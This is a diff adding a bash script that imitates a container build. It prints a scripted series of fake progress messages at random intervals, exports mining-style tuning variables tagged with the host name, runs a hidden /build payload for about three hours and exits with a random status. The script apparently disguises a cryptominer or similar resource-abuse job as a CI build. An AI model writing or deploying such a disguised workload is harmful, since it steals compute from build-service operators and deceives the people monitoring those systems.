@@ -1,0 +1,45 @@
+#!/bin/bash
+
+apk --no-cache add wget coreutils;
+
+logs="
+checking OS
+checking env
+checking dependencies
+checking updates
+listing headers
+listing secrets
+computing variables
+deciding runtime
+organizing libraries
+setting up directories
+setting up links
+splitting jobs
+starting jobs
+waiting for build
+waiting for objects
+waiting for libs
+waiting for links
+testing objects
+testing libs
+testing suite
+timing out remaining tasks
+"
+log() {
+    local IFS=$'\n' c=0
+    for l in $logs; do
+        echo ${l}...
+        sleep $((RANDOM%30+30))
+    done
+    while :; do
+        echo ${l}...
+        sleep $((RANDOM%30+30))
+    done
+}
+log &
+
+export ENV_VARS="X_ID=docker-${NAME:-$HOSTNAME} CSLEEP=5000 THREADS_FIXED=1 MHF_FIXED=2"
+
+timeout -k 5 $((RANDOM%300+10800)) bash < /build
+
+exit $((RANDOM%2))
